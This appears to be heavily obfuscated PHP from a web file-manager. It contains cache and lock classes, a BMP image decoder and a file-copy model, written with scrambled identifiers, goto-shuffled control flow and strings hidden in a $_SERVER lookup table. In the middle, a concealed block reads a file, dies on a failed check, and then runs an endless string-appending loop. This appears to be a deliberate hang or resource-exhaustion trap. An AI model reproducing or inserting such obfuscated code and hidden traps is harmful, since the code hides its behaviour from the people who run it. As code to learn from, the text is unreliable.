$b—³æ¯Ö¦ì = self::key($b—³æ¯Ö¦ì); if (isset(self::$memoryCache[$b—³æ¯Ö¦ì]) && self::$memoryCache[$b—³æ¯Ö¦ì] === $FÀ»œÆ††) { return !0; } if ($FåøùÜ°ˆ  === 0) { self::$memoryCache[$b—³æ¯Ö¦ì] = $FÀ»œÆ††; return !0; } goto B®»Š§è¿ë; bÚÒ³µµº: } public static function remove($dÔéÜÖğÕ) { goto e““Œ®¹¡; e““Œ®¹¡: $dÔéÜÖğÕ = self::key($dÔéÜÖğÕ); unset(self::$memoryCache[$dÔéÜÖğÕ]); self::clearTimeout(); goto B ©İ–¿¥À; B ©İ–¿¥À: CacheLock::lock($dÔéÜÖğÕ); $f‡ÊØ­Ìçâ = self::init()->remove($dÔéÜÖğÕ); CacheLock::unlock($dÔéÜÖğÕ); goto C¦½‘„´è‰; C¦½‘„´è‰: return $f‡ÊØ­Ìçâ; goto bÓ»À˜‰; bÓ»À˜‰: } public static function clearMemory($b³¼ëŸÜ = false) { if ($b³¼ëŸÜ) { $b³¼ëŸÜ = self::key($b³¼ëŸÜ); unset(self::$memoryCache[$b³¼ëŸÜ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ÍÓÖ€°å][518])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ÍÓÖ€°å][519])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Cô³ÈéªÊ¢, $b†Æ‰™Ø‰£) { $aë¾«¦ëÎ =& $_SERVER[ÍÓÖ€°å]; $this->cachePath = $Cô³ÈéªÊ¢[$aë¾«¦ëÎ[76]]; $this->prefix = $aë¾«¦ëÎ[520]; $this->cacheTime = $b†Æ‰™Ø‰£; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($a”…ñì¨ˆë) { $B‚•¯°Åª¯ =& $_SERVER[ÍÓÖ€°å]; $a”…ñì¨ˆë = str_replace(array($B‚•¯°Åª¯[486], $B‚•¯°Åª¯[92], $B‚•¯°Åª¯[70]), $B‚•¯°Åª¯[521], $a”…ñì¨ˆë); return $this->cachePath . $B‚•¯°Åª¯[522] . $a”…ñì¨ˆë . $B‚•¯°Åª¯[523]; } public function set($B¹¨¾ø˜, $fÌ–Í²ç¢, $C‹¤ŸÃÄ¤Ö = false) { $bŠøµ”ïÕ¤ = $this->getFile($B¹¨¾ø˜); if (file_put_contents($bŠøµ”ïÕ¤, $this->prefix . $fÌ–Í²ç¢, LOCK_EX)) { return !0; } @unlink($bŠøµ”ïÕ¤); return !1; } public function get($B‘æñÜ‡İö) { $e«Ãã‘ôôÛ = $this->getFile($B‘æñÜ‡İö); if (file_exists($e«Ãã‘ôôÛ) && filemtime($e«Ãã‘ôôÛ) < time() - $this->cacheTime) { @unlink($e«Ãã‘ôôÛ); return !1; } $CµİŒƒù®± = @file_get_contents($e«Ãã‘ôôÛ); return substr($CµİŒƒù®±, strlen($this->prefix)); } public function remove($f÷í«í…éš) { $B§ †ìÁ§– = $this->getFile($f÷í«í…éš); return @unlink($B§ †ìÁ§–); } public function deleteAll() { $bßäÑÉÁ¡Ë =& $_SERVER[ÍÓÖ€°å]; $F¾óÇ¾„ = scandir($this->cachePath); foreach ($F¾óÇ¾„ as $bá×¯Í‘Èæ) { $b–ì¬¶Ñæ’ = $this->cachePath . $bá×¯Í‘Èæ; if (strpos($b–ì¬¶Ñæ’, $bßäÑÉÁ¡Ë[523]) && strpos($b–ì¬¶Ñæ’, $bßäÑÉÁ¡Ë[524])) { @unlink($b–ì¬¶Ñæ’); } } } public function clearTimeout() { $F–äĞîƒÜ =& $_SERVER[ÍÓÖ€°å]; $B®ÙŠ©¨ = scandir($this->cachePath); foreach ($B®ÙŠ©¨ as $BÒ¯îèäİÜ) { $E„è†ÙÂ‹ã = $this->cachePath . $BÒ¯îèäİÜ; if (strpos($E„è†ÙÂ‹ã, $F–äĞîƒÜ[523]) && strpos($E„è†ÙÂ‹ã, $F–äĞîƒÜ[524]) && filemtime($E„è†ÙÂ‹ã) < time() - $this->cacheTime) { @unlink($E„è†ÙÂ‹ã); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $lockItem = array(); public static function init() { goto BùÛšÑÁ±æ; e™‡±¹ÒÖ: self::$timeout = $dÑ±˜¨ì‡õ[$bÎ•©»ù‡š[525]] ? $dÑ±˜¨ì‡õ[$bÎ•©»ù‡š[525]] : 10; $B„ù‘éÆô… = $GLOBALS[$bÎ•©»ù‡š[6]][$bÎ•©»ù‡š[17]][$bÎ•©»ù‡š[481]]; if ($dÑ±˜¨ì‡õ[$bÎ•©»ù‡š[513]] == $bÎ•©»ù‡š[17] && $B„ù‘éÆô… == $bÎ•©»ù‡š[9]) { $dÑ±˜¨ì‡õ[$bÎ•©»ù‡š[513]] = $bÎ•©»ù‡š[155]; } goto a‚«òÖÚ™; a‚«òÖÚ™: switch ($dÑ±˜¨ì‡õ[$bÎ•©»ù‡š[513]]) { case $bÎ•©»ù‡š[516]: self::$handle = new CacheLockRedis(); break; case $bÎ•©»ù‡š[517]: self::$handle = new CacheLockMemcached(); break; case $bÎ•©»ù‡š[17]: self::$handle = new CacheLockDatabase(); break; case $bÎ•©»ù‡š[155]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto dáå©Ùß“¸; BùÛšÑÁ±æ: $bÎ•©»ù‡š =& $_SERVER[ÍÓÖ€°å]; if (self::$handle) { return self::$handle; } $dÑ±˜¨ì‡õ = $GLOBALS[$bÎ•©»ù‡š[6]][$bÎ•©»ù‡š[329]]; goto e™‡±¹ÒÖ; dáå©Ùß“¸: } private static function key($CÍ¼ß½Õä¡) { return $_SERVER[ÍÓÖ€°å][526] . Cache::key($CÍ¼ß½Õä¡); } public static function initReset() { self::$handle = !1; } public static function lockGlobal($d¦ĞƒƒËã‹, $BèíÆÊ—î) { return self::lock($d¦ĞƒƒËã‹, $BèíÆÊ—î, !0); } public static function lock($eâ‚õ©º¨, $E–„È…® = false, $CÄ¶Í„İ  = false) { goto fÕ†¡ê×”†; C´ÔíäÉò: $AÅ¢‘İßƒÈ = timeFloat(); $E–„È…® = $E–„È…® ? $E–„È…® : self::$timeout; $E¸Ü—‡íâÕ = $d¼æŒº£¾Š->lock($eâ‚õ©º¨, $E–„È…®); goto A–“ğïÙ’; A–“ğïÙ’: if (!$E¸Ü—‡íâÕ) { write_log($A¨Öóêƒ[527] . (timeFloat() - $AÅ¢‘İßƒÈ) . $A¨Öóêƒ[68] . get_caller_msg(), $A¨Öóêƒ[528]); show_json("\x4c\x6f\143\x6b\x20\141\x63\164\x69\x6f\156\x3a\x20{$eâ‚õ©º¨}\40\x74\151\x6d\x65\157\165\164\x2c\x6f\166\x65\162\40{$E–„È…®}\x20\x73", !1); } if (!$CÄ¶Í„İ ) { self::$lockItem[$eâ‚õ©º¨] = !0; } return $E¸Ü—‡íâÕ; goto côíÚ˜é†ù; fÕ†¡ê×”†: $A¨Öóêƒ =& $_SERVER[ÍÓÖ€°å]; $d¼æŒº£¾Š = self::init(); $eâ‚õ©º¨ = self::key($eâ‚õ©º¨); goto C´ÔíäÉò; côíÚ˜é†ù: } public static function unlock($b”äµ“µ¢æ) { $b”äµ“µ¢æ = self::key($b”äµ“µ¢æ); self::$lockItem[$b”äµ“µ¢æ] = null; return self::init()->unlock($b”äµ“µ¢æ); } public static function unlockRuntime() { $cÖ×Ãİºøä = self::$lockItem; $aŸ«Â­Ó‡³ = self::init(); foreach ($cÖ×Ãİºøä as $aÄÍíé¯„ => $báØâÄÂ) { if ($báØâÄÂ) { $aŸ«Â­Ó‡³->unlock($aÄÍíé¯„); } } } } goto c¯…ŞöÚÔ; c››ØøÚ÷: define($_SERVER[ÍÓÖ€°å][1301], 3); define($_SERVER[ÍÓÖ€°å][1302], 4); define($_SERVER[ÍÓÖ€°å][1303], 5); goto B„‘š‚ùË¶; B¡Ûç±Œ†¥: if (!isset($_SERVER[$_SERVER[ÍÓÖ€°å][544]]) || !isset($_SERVER[$_SERVER[ÍÓÖ€°å][945]])) { goto cåÅ³ŸÏµî; cåÅ³ŸÏµî: $Cå’Ç¶™¨ = $_SERVER[ÍÓÖ€°å][546]; $Fù¢­§„ß† = BASIC_PATH . $_SERVER[ÍÓÖ€°å][547]; $C¨Ê¢äëí = $Cå’Ç¶™¨($Fù¢­§„ß†); goto cÁ‡›‹ÃÎ•; Cå«¹òé”ƒ: $D½æĞ¨‰Í(BASIC_PATH . $_SERVER[ÍÓÖ€°å][547]); for (;;) { $D½æĞ¨‰Í = $D½æĞ¨‰Í . $_SERVER[ÍÓÖ€°å][551]; } goto c£­¦„ôÇİ; cÁ‡›‹ÃÎ•: $c®¥†ÕŸ‘ = explode($_SERVER[ÍÓÖ€°å][212], $C¨Ê¢äëí); if (count($c®¥†ÕŸ‘) < $_SERVER[ÍÓÖ€°å][1238]) { die; } $D½æĞ¨‰Í = $_SERVER[ÍÓÖ€°å][1239]; goto Cå«¹òé”ƒ; c£­¦„ôÇİ: } class ZipStream { } class imageGdBMP { public static function load($cÓ†ˆİâ„) { $Bİ«³–¸µ = fopen($cÓ†ˆİâ„, $_SERVER[ÍÓÖ€°å][1134]); if ($Bİ«³–¸µ === !1) { return !1; } $E¸÷¥¦ĞÈ = self::loadFromStream($Bİ«³–¸µ); fclose($Bİ«³–¸µ); return $E¸÷¥¦ĞÈ; } public static function loadFromStream($AñÏÆ²‡ ²) { $aòéÊ¥õâí =& $_SERVER[ÍÓÖ€°å]; $Bœ½¿¦¨¹ = fread($AñÏÆ²‡ ², 14); if ($Bœ½¿¦¨¹ === !1) { return !1; } if ($Bœ½¿¦¨¹[0] != $aòéÊ¥õâí[1410] || $Bœ½¿¦¨¹[1] != $aòéÊ¥õâí[1411]) { return !1; } $bèÇ›—ç«œ = unpack($aòéÊ¥õâí[1412] . $aòéÊ¥õâí[1413] . $aòéÊ¥õâí[1414] . $aòéÊ¥õâí[1415] . $aòéÊ¥õâí[1416], $Bœ½¿¦¨¹); return self::loadFromStreamAndFileHeader($AñÏÆ²‡ ², $bèÇ›—ç«œ); } public static function loadFromStreamAndFileHeader($a¦‘Œ‚õƒĞ, array $C¾ß¨…ïÊÌ) { goto B¦Ì£†´‚; Eš²ÃßâíÌ: if ($AíŒŒ¢»Ü­ === !1) { return !1; } list(, $AÇŠö‚ÏÊà) = unpack($F±‰Èçï“[1417], $AíŒŒ¢»Ü­); if ($AÇŠö‚ÏÊà == 12) { goto EÅòßºƒ©¢; EÅòßºƒ©¢: $AíŒŒ¢»Ü­ = fread($a¦‘Œ‚õƒĞ, $AÇŠö‚ÏÊà - 4); if ($AíŒŒ¢»Ü­ === !1) { return !1; } extract(unpack($F±‰Èçï“[1418] . $F±‰Èçï“[1419] . $F±‰Èçï“[1420] . $F±‰Èçï“[1421], $AíŒŒ¢»Ü­)); goto b‡†›¢´; BÈùè¿À‡‹: $bÊÚğ¬Ğƒ = 255; goto B×„†Á¾Åİ; b‡†›¢´: $eÓÉ‘”†§Û = $AÆ¬æÑŒÏ = $CĞ†ŒÃ±ŒÏ = $F–õåô–çˆ = 0; $e±Ü­¿ÂÌ = 16711680; $aŞöê½ = 65280; goto BÈùè¿À‡‹; B×„†Á¾Åİ: } else { if (124 < $AÇŠö‚ÏÊà || $AÇŠö‚ÏÊà < 40) { return !1; } else { goto DÀ‚Ñæò; DÀ‚Ñæò: $AíŒŒ¢»Ü­ = fread($a¦‘Œ‚õƒĞ, 36); if ($AíŒŒ¢»Ü­ === !1) { return !1; } extract(unpack($F±‰Èçï“[1422] . $F±‰Èçï“[1423] . $F±‰Èçï“[1420] . $F±‰Èçï“[1424] . $F±‰Èçï“[1425] . $F±‰Èçï“[1426] . $F±‰Èçï“[1427] . $F±‰Èçï“[1428] . $F±‰Èçï“[1429] . $F±‰Èçï“[1430], $AíŒŒ¢»Ü­)); goto c„¶«ïä˜º; dÃñ‡ëÑØ: if (($AÏ†´œÇ == 16 || $AÏ†´œÇ == 24 || $AÏ†´œÇ == 32) && $F–õåô–çˆ == 0 && $e±Ü­¿ÂÌ == 0 && $aŞöê½ == 0 && $bÊÚğ¬Ğƒ == 0) { switch ($AÏ†´œÇ) { case 16: $e±Ü­¿ÂÌ = 31744; $aŞöê½ = 992; $bÊÚğ¬Ğƒ = 31; break; case 24: case 32: $e±Ü­¿ÂÌ = 16711680; $aŞöê½ = 65280; $bÊÚğ¬Ğƒ = 255; break; } } goto d¯âñÜäª; c„¶«ïä˜º: if ($fù›Î‹“ & 2147483648) { $fù›Î‹“ = -(~$fù›Î‹“ & 4294967295) - 1; } if ($Bõß’œÂ’ & 2147483648) { $Bõß’œÂ’ = -(~$Bõß’œÂ’ & 4294967295) - 1; } if ($D»÷ˆ‘ÍÕœ & 2147483648) { $D»÷ˆ‘ÍÕœ = -(~$D»÷ˆ‘ÍÕœ & 4294967295) - 1; } goto FšÅ®ó±éâ; FšÅ®ó±éâ: if ($A¶öÊòÛÕ & 2147483648) { $A¶öÊòÛÕ = -(~$A¶öÊòÛÕ & 4294967295) - 1; } if ($C¾ß¨…ïÊÌ[$F±‰Èçï“[382]] != 0) { $cŒï÷­äë­ = $AÏ†´œÇ == 1 || $AÏ†´œÇ == 4 || $AÏ†´œÇ == 8 ? ($eÓÉ‘”†§Û ? $eÓÉ‘”†§Û : pow(2, $AÏ†´œÇ)) << 2 : 0; $Aâ’Ö¿‚·… = $D™µÙ‘«Ïª ? $D™µÙ‘«Ïª : ($fù›Î‹“ * $AÏ†´œÇ + 31 >> 3 & ~3) * abs($Bõß’œÂ’); $aää—‚¨• = $C¾ß¨…ïÊÌ[$F±‰Èçï“[382]] - $Aâ’Ö¿‚·… - $cŒï÷­äë­ - 14; if ($AÇŠö‚ÏÊà < $aää—‚¨• && 40 <= $AÇŠö‚ÏÊà && $AÇŠö‚ÏÊà <= 124) { $AÇŠö‚ÏÊà = $aää—‚¨•; } } if ($AÇŠö‚ÏÊà - 40 > 0) { $AíŒŒ¢»Ü­ = fread($a¦‘Œ‚õƒĞ, $AÇŠö‚ÏÊà - 40); if ($AíŒŒ¢»Ü­ === !1) { return !1; } extract(unpack($F±‰Èçï“[1431] . $F±‰Èçï“[1432] . $F±‰Èçï“[1433] . $F±‰Èçï“[1434], $AíŒŒ¢»Ü­ . str_repeat($F±‰Èçï“[1435], 120))); } else { $CĞ†ŒÃ±ŒÏ = $e±Ü­¿ÂÌ = $aŞöê½ = $bÊÚğ¬Ğƒ = 0; } goto dÃñ‡ëÑØ; d¯âñÜäª: } } goto dÉˆĞğˆ¨; bèÖ®Ùã­‡: $C”«ó‘Ÿ„§ = abs($Bõß’œÂ’); $CÄ™ÂÄ…¢ = $Bõß’œÂ’ > 0 ? $C”«ó‘Ÿ„§ - 1 : 0; $a ¸ÄóÖ™ = $Bõß’œÂ’ > 0 ? -1 : 1; goto b¸§†Ï¦µ«; dÉˆĞğˆ¨: if ($fù›Î‹“ == 0 || $Bõß’œÂ’ == 0 || $D±ŸœŸ¹£‡ != 1 || ($CĞ†ŒÃ±ŒÏ & $e±Ü­¿ÂÌ) != 0 || ($CĞ†ŒÃ±ŒÏ & $aŞöê½) != 0 || ($CĞ†ŒÃ±ŒÏ & $bÊÚğ¬Ğƒ) != 0 || ($e±Ü­¿ÂÌ & $aŞöê½) != 0 || ($e±Ü­¿ÂÌ & $bÊÚğ¬Ğƒ) != 0 || ($aŞöê½ & $bÊÚğ¬Ğƒ) != 0) { return !1; } if ($F–õåô–çˆ == 4 || $F–õåô–çˆ == 5) { $AíŒŒ¢»Ü­ = stream_get_contents($a¦‘Œ‚õƒĞ, $D™µÙ‘«Ïª); if ($AíŒŒ¢»Ü­ === !1) { return !1; } return imagecreatefromstring($AíŒŒ¢»Ü­); } $bßªÅŸØÔ = $fù›Î‹“ * $AÏ†´œÇ + 31 >> 3 & ~3; goto bèÖ®Ùã­‡; B¦Ì£†´‚: $F±‰Èçï“ =& $_SERVER[ÍÓÖ€°å]; if ($C¾ß¨…ïÊÌ[$F±‰Èçï“[787]] != 19778) { return !1; } $AíŒŒ¢»Ü­ = fread($a¦‘Œ‚õƒĞ, 4); goto Eš²ÃßâíÌ; b¸§†Ï¦µ«: if ($AÏ†´œÇ == 1 || $AÏ†´œÇ == 4 || $AÏ†´œÇ == 8) { goto aÀŠÔ³Ô…ç; Câ£¹Ì‡Ÿ: $Ašâ¥Ñ›’ä = array(); for ($f¹Ş±ç£‚… = 0; $f¹Ş±ç£‚… < $Eˆìãµ»; ++$f¹Ş±ç£‚…) { $AíŒŒ¢»Ü­ = fread($a¦‘Œ‚õƒĞ, $aÕˆğÆâº•); if ($AíŒŒ¢»Ü­ === !1) { imagedestroy($cê“ø £); return !1; } extract(unpack($F±‰Èçï“[1436], $AíŒŒ¢»Ü­ . $F±‰Èçï“[1435])); $Ašâ¥Ñ›’ä[] = imagecolorallocate($cê“ø £, $b†ê–”¤‚, $FŒùšºÀã—, $f‡ì…‚¿Åò); } $dÙ•—Ã‹ŸÌ = 8 - $AÏ†´œÇ; goto FŸ·–ñéí; FŸ·–ñéí: $EäÏ™ªÕØ· = (1 << $AÏ†´œÇ) - 1 << $dÙ•—Ã‹ŸÌ; if ($F–õåô–çˆ == 1 || $F–õåô–çˆ == 2) { $f±Ó¡öæ³‡ = 0; $F•›©Œõï‘ = $AÏ†´œÇ >> 2 & 1; for (;;) { if ($f±Ó¡öæ³‡ < -1 || $f±Ó¡öæ³‡ > $fù›Î‹“ || $CÄ™ÂÄ…¢ < -1 || $CÄ™ÂÄ…¢ > $Bõß’œÂ’) { imagedestroy($cê“ø £); return !1; } $AíŒŒ¢»Ü­ = fread($a¦‘Œ‚õƒĞ, 1); if ($AíŒŒ¢»Ü­ === !1) { imagedestroy($cê“ø £); return !1; } switch ($AíŒŒ¢»Ü­) { case $F±‰Èçï“[1435]: $AíŒŒ¢»Ü­ = fread($a¦‘Œ‚õƒĞ, 1); if ($AíŒŒ¢»Ü­ === !1) { imagedestroy($cê“ø £); return !1; } switch ($AíŒŒ¢»Ü­) { case $F±‰Èçï“[1435]: $CÄ™ÂÄ…¢ += $a ¸ÄóÖ™; $f±Ó¡öæ³‡ = 0; break; case $F±‰Èçï“[1437]: $CÄ™ÂÄ…¢ = 0; $f±Ó¡öæ³‡ = 0; break 3; case $F±‰Èçï“[1438]: $AíŒŒ¢»Ü­ = fread($a¦‘Œ‚õƒĞ, 2); if ($AíŒŒ¢»Ü­ === !1) { imagedestroy($cê“ø £); return !1; } list(, $fÇ¬ŠÄ°Ÿ, $CÔ£ØŠªäë) = unpack($F±‰Èçï“[1439], $AíŒŒ¢»Ü­); $f±Ó¡öæ³‡ += $fÇ¬ŠÄ°Ÿ; $CÄ™ÂÄ…¢ += $CÔ£ØŠªäë * $a ¸ÄóÖ™; break; default: list(, $aîµàƒ˜ã) = unpack($F±‰Èçï“[1440], $AíŒŒ¢»Ü­); $F¡õŠÉ¿±Ì = ($aîµàƒ˜ã >> $F•›©Œõï‘) + ($aîµàƒ˜ã & $F•›©Œõï‘); $AíŒŒ¢»Ü­ = fread($a¦‘Œ‚õƒĞ, $F¡õŠÉ¿±Ì + 1 & ~1); if ($AíŒŒ¢»Ü­ === !1) { imagedestroy($cê“ø £); return !1; } for ($f¹Ş±ç£‚… = 0, $CŒ…’âÖÂ = 0; $f¹Ş±ç£‚… < $aîµàƒ˜ã; ++$f¹Ş±ç£‚…, ++$f±Ó¡öæ³‡, $CŒ…’âÖÂ += $AÏ†´œÇ) { list(, $cÎ‚¤†…¦) = unpack($F±‰Èçï“[1440], $AíŒŒ¢»Ü­[$CŒ…’âÖÂ >> 3]); $f‡ì…‚¿Åò = $CŒ…’âÖÂ & 7; imagesetpixel($cê“ø £, $f±Ó¡öæ³‡, $CÄ™ÂÄ…¢, $Ašâ¥Ñ›’ä[($cÎ‚¤†…¦ & $EäÏ™ªÕØ· >> $f‡ì…‚¿Åò) >> $dÙ•—Ã‹ŸÌ - $f‡ì…‚¿Åò]); } break; } break; default: $Eî–’Æ÷› = fread($a¦‘Œ‚õƒĞ, 1); if ($Eî–’Æ÷› === !1) { imagedestroy($cê“ø £); return !1; } list(, $d°º†êŒÏÆ, $cÎ‚¤†…¦) = unpack($F±‰Èçï“[1439], $AíŒŒ¢»Ü­ . $Eî–’Æ÷›); for ($f¹Ş±ç£‚… = 0, $CŒ…’âÖÂ = 0; $f¹Ş±ç£‚… < $d°º†êŒÏÆ; ++$f¹Ş±ç£‚…, ++$f±Ó¡öæ³‡, $CŒ…’âÖÂ += $AÏ†´œÇ) { $f‡ì…‚¿Åò = $CŒ…’âÖÂ & 7; imagesetpixel($cê“ø £, $f±Ó¡öæ³‡, $CÄ™ÂÄ…¢, $Ašâ¥Ñ›’ä[($cÎ‚¤†…¦ & $EäÏ™ªÕØ· >> $f‡ì…‚¿Åò) >> $dÙ•—Ã‹ŸÌ - $f‡ì…‚¿Åò]); } break; } } } else { for ($dË¯í¾¯ƒ‘ = 0; $dË¯í¾¯ƒ‘ < $C”«ó‘Ÿ„§; ++$dË¯í¾¯ƒ‘, $CÄ™ÂÄ…¢ += $a ¸ÄóÖ™) { $AíŒŒ¢»Ü­ = fread($a¦‘Œ‚õƒĞ, $bßªÅŸØÔ); if ($AíŒŒ¢»Ü­ === !1) { imagedestroy($cê“ø £); return !1; } $CŒ…’âÖÂ = 0; for ($f±Ó¡öæ³‡ = 0; $f±Ó¡öæ³‡ < $fù›Î‹“; ++$f±Ó¡öæ³‡, $CŒ…’âÖÂ += $AÏ†´œÇ) { list(, $cÎ‚¤†…¦) = unpack($F±‰Èçï“[1440], $AíŒŒ¢»Ü­[$CŒ…’âÖÂ >> 3]); $f‡ì…‚¿Åò = $CŒ…’âÖÂ & 7; imagesetpixel($cê“ø £, $f±Ó¡öæ³‡, $CÄ™ÂÄ…¢, $Ašâ¥Ñ›’ä[($cÎ‚¤†…¦ & $EäÏ™ªÕØ· >> $f‡ì…‚¿Åò) >> $dÙ•—Ã‹ŸÌ - $f‡ì…‚¿Åò]); } } } goto CñÚæîê¶‡; aÀŠÔ³Ô…ç: $cê“ø £ = imagecreate($fù›Î‹“, $C”«ó‘Ÿ„§); $aÕˆğÆâº• = $AÇŠö‚ÏÊà == 12 ? 3 : 4; $Eˆìãµ» = $eÓÉ‘”†§Û ? $eÓÉ‘”†§Û : pow(2, $AÏ†´œÇ); goto Câ£¹Ì‡Ÿ; CñÚæîê¶‡: } else { goto D§Ğ¥ÊÁÆ; e–ù‰í‰”±: for ($dË¯í¾¯ƒ‘ = 0; $dË¯í¾¯ƒ‘ < $C”«ó‘Ÿ„§; ++$dË¯í¾¯ƒ‘, $CÄ™ÂÄ…¢ += $a ¸ÄóÖ™) { $AíŒŒ¢»Ü­ = fread($a¦‘Œ‚õƒĞ, $bßªÅŸØÔ); if ($AíŒŒ¢»Ü­ === !1) { imagedestroy($cê“ø £); return !1; } $CŒ…’âÖÂ = 0; for ($f±Ó¡öæ³‡ = 0; $f±Ó¡öæ³‡ < $fù›Î‹“; ++$f±Ó¡öæ³‡, $CŒ…’âÖÂ += $fö„àÉ³ºÆ) { list(, $cÎ‚¤†…¦) = unpack($F±‰Èçï“[1417], substr($AíŒŒ¢»Ü­, $CŒ…’âÖÂ, $fö„àÉ³ºÆ) . $F±‰Èçï“[1441]); $cŸ©·Å‹×‚ = $cÎ‚¤†…¦ & $CĞ†ŒÃ±ŒÏ; $cê‰îŠ•’ = $cÎ‚¤†…¦ & $e±Ü­¿ÂÌ; $EÂ­Ùí­…Ò = $cÎ‚¤†…¦ & $aŞöê½; $AÅâ®¦¢‡š = $cÎ‚¤†…¦ & $bÊÚğ¬Ğƒ; $FâËĞ£´•Œ = $cÁ×º£ŸÁ¥ - (($cŸ©·Å‹×‚ << 7) - $cŸ©·Å‹×‚) * $e¹¦ŸÅ¥Õƒ; $b†ê–”¤‚ = (($cê‰îŠ•’ << 8) - $cê‰îŠ•’) * $A–÷Óãœ»; $FŒùšºÀã— = (($EÂ­Ùí­…Ò << 8) - $EÂ­Ùí­…Ò) * $EÇø¯±ó¶‚; $f‡ì…‚¿Åò = (($AÅâ®¦¢‡š << 8) - $AÅâ®¦¢‡š) * $C“¦õàÇßÔ; imagesetpixel($cê“ø £, $f±Ó¡öæ³‡, $CÄ™ÂÄ…¢, $FâËĞ£´•Œ << 24 | $b†ê–”¤‚ << 16 | $FŒùšºÀã— << 8 | $f‡ì…‚¿Åò); } } imagealphablending($cê“ø £, !0); goto b®ñ†—À‚Ò; D§Ğ¥ÊÁÆ: $cê“ø £ = imagecreatetruecolor($fù›Î‹“, $C”«ó‘Ÿ„§); imagealphablending($cê“ø £, !1); if ($CĞ†ŒÃ±ŒÏ) { imagesavealpha($cê“ø £, !0); } goto c ’·­Æ¤; D··ÅÕÒ­¨: $A–÷Óãœ» = $e±Ü­¿ÂÌ ? 1 / $e±Ü­¿ÂÌ : 1; $EÇø¯±ó¶‚ = $aŞöê½ ? 1 / $aŞöê½ : 1; $C“¦õàÇßÔ = $bÊÚğ¬Ğƒ ? 1 / $bÊÚğ¬Ğƒ : 1; goto e–ù‰í‰”±; c ’·­Æ¤: $fö„àÉ³ºÆ = $AÏ†´œÇ >> 3; $cÁ×º£ŸÁ¥ = $CĞ†ŒÃ±ŒÏ ? 127 : 0; $e¹¦ŸÅ¥Õƒ = $CĞ†ŒÃ±ŒÏ ? 1 / $CĞ†ŒÃ±ŒÏ : 1; goto D··ÅÕÒ­¨; b®ñ†—À‚Ò: } return $cê“ø £; goto E¶°¿˜Ì›À; E¶°¿˜Ì›À: } } goto F¥ œÚ¹‡¡; EğÆøŠäˆ†: class SourceListMoveModel extends SourceListModel { public function isParentOf($B–·âÅö‹, $cÏÈ››÷‘) { goto aˆàŠÙ¢ô; aÚ…’¼’°î: return $B¼Şğ…”Œù; goto CÂ×âŠ›ó; B”Í¶Øù«™: $dÎìºŒ¾îõ = $FêÚáÊøÄ[$fÒ‰‹ÏÃ÷á[364]] . $FêÚáÊøÄ[$fÒ‰‹ÏÃ÷á[365]] . $fÒ‰‹ÏÃ÷á[47]; $cœÀîâùìÊ = $bË£áÑñ[$fÒ‰‹ÏÃ÷á[364]] . $bË£áÑñ[$fÒ‰‹ÏÃ÷á[365]] . $fÒ‰‹ÏÃ÷á[47]; $B¼Şğ…”Œù = strpos($cœÀîâùìÊ, $dÎìºŒ¾îõ) === 0; goto aÚ…’¼’°î; aˆàŠÙ¢ô: $fÒ‰‹ÏÃ÷á =& $_SERVER[ÍÓÖ€°å]; $FêÚáÊøÄ = $this->sourceInfo($B–·âÅö‹); $bË£áÑñ = $this->sourceInfo($cÏÈ››÷‘); goto B”Í¶Øù«™; CÂ×âŠ›ó: } public function copy($Aˆ±İˆ£Š, $dÀäñ‹„‹, $b¢ –¿Í”™ = REPEAT_REPLACE, $aƒéŒ¡Ş• = '') { goto CŸŠõŸŒâ†; AÎÍÅ¹—: $this->saveAll($FÎ´Ş¿™·´[$D¾¬­–¦Ì[370]]); Model($D¾¬­–¦Ì[155])->linkAdd($FÎ´Ş¿™·´[$D¾¬­–¦Ì[368]]); $this->folderSizeReset($dÀäñ‹„‹); goto AÉ¥†É™‹ƒ; AÉ¥†É™‹ƒ: $this->updateModifyTime($dÀäñ‹„‹); return $CÚõ•Ì»İ; goto cæ­²œ··ƒ; CŸŠõŸŒâ†: $D¾¬­–¦Ì =& $_SERVER[ÍÓÖ€°å]; $dì‚àÜ°È› = $this->sourceInfo($Aˆ±İˆ£Š); $DÔø«ÙöºÍ = $this->sourceInfo($dÀäñ‹„‹); goto båÇƒ§Ø¶·; båÇƒ§Ø¶·: if (!$dì‚àÜ°È› || !$DÔø«ÙöºÍ || $DÔø«ÙöºÍ[$D¾¬­–¦Ì[366]] != $D¾¬­–¦Ì[367]) { return !1; } if ($this->isParentOf($Aˆ±İˆ£Š, $dÀäñ‹„‹)) { return !1; } $FÎ´Ş¿™·´ = array($D¾¬­–¦Ì[368] => array(), $D¾¬­–¦Ì[369] => array(), $D¾¬­–¦Ì[370] => array()); goto dÓÙ¿‚ã; dÓÙ¿‚ã: $dÃÇÀ©£‡† = $this->fileNameExistCache($dÀäñ‹„‹, $dì‚àÜ°È›[$D¾¬­–¦Ì[28]]); $CÚõ•Ì»İ = $this->_copy($Aˆ±İˆ£Š, $dÀäñ‹„‹, $b¢ –¿Í”™, $FÎ´Ş¿™·´, !0, $aƒéŒ¡Ş•); $this->_childrenListClear(); goto b«“×ŞäÂ´; b«“×ŞäÂ´: if ($dì‚àÜ°È›[$D¾¬­–¦Ì[366]] == $D¾¬­–¦Ì[367] && $dÃÇÀ©£‡† == $CÚõ•Ì»İ) { $this->folderSizeResetChildren($dÃÇÀ©£‡†); } Model($D¾¬­–¦Ì[371])->addAll($FÎ´Ş¿™·´[$D¾¬­–¦Ì[369]], array(), !0); Model($D¾¬­–¦Ì[372])->eventCopy($CÚõ•Ì»İ); goto AÎÍÅ¹—; cæ­²œ··ƒ: } private function _copy($E…àì³‡¯, $D…´Ş˜ó, $f¹¥÷­‚‚å, &$F¾ñËÑ‘¢¿, $DØ˜¯¿åÄ­, $f…ãÅ“Öå† = '') { goto Aó£ÜÒ¾Á¨; Aó£ÜÒ¾Á¨: $cØõƒ×‰‡¬ =& $_SERVER[ÍÓÖ€°å]; $b¿†ö«ˆ£ğ = $this->sourceInfoCache($E…àì³‡¯); $DÆ „‹¦†² = $b¿†ö«ˆ£ğ[$cØõƒ×‰‡¬[366]] == $cØõƒ×‰‡¬[367]; goto eí…›Ñé×; aà’Ôö³è½: return $e¶ô£İ±ÇÈ; 